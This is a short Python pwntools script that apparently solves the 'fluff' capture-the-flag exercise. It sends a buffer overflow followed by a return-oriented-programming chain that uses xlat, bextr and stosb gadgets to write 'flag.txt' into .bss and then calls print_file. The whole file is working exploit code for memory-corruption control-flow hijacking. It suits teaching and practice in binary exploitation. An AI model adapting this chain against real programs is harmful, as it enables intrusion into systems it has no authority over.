from pwn import *
elf = ELF("fluff")
rdiGadget = 0x4006a3 #pop rdi; ret
#r12-15: 0x40069c
#r13-15: 0x40069e
#r14-15: 0x4006a0
#r15-15: 0x4006a2
writeGadget = 0x400639 # stosb byte ptr [rdi], al; ret;
bss = 0x0000000000601038
xlatGadget = 0x400628 #xlat %ds:(%rbx) ; ret saves rbx + al to al
alGadget = 0x40062a
'''
pop    %rdx
pop    %rcx
add    $0x3ef2,%rcx
bextr  %rdx,%rcx,%rbx
ret
take rdx, rcx - 0x3e62
rcx = 0x0102 : rbx = (rdx >> 2) & (1 << 1 - 1)
'''

#sets rbx to val
def set_rbx(val):
    payload = b""
    payload += p64(alGadget)
    payload += p64(0x4000)
    payload += p64(val - 0x3ef2, sign="signed")
    return payload

def read_to_al(prev_al, address):
    payload = b""
    payload += set_rbx(-prev_al + address)
    payload += p64(xlatGadget)
    return payload

def write_text(text, address, al_start):
    payload = b""
    cur = address
    al = al_start
    for char in text:
        #little endian - lower first
        address = next(elf.search(int.to_bytes(char)))
        payload += read_to_al(al, address)
        al = char
        payload += p64(rdiGadget)
        payload += p64(cur)
        payload += p64(writeGadget)
        cur += 1
    return payload

alStart = 11


text = b"flag.txt"
payload = b""
payload += b"a" * 40
payload += write_text(text, bss, alStart)
payload += p64(rdiGadget)
payload += p64(bss)
payload += p64(elf.plt["print_file"])
io = elf.process()
io.sendline(payload)
io.interactive()
